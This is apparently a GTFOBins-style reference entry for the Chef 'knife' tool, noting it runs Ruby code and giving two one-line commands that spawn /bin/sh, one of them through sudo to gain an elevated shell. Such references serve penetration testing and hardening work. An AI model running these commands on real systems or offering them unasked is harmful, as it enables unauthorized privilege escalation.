---
description: This is capable of running [`ruby`](/gtfobins/ruby/) code.
functions:
  shell:
    - code: |
        knife exec -E 'exec "/bin/sh"'
  sudo:
    - code: |
        sudo knife exec -E 'exec "/bin/sh"'
---
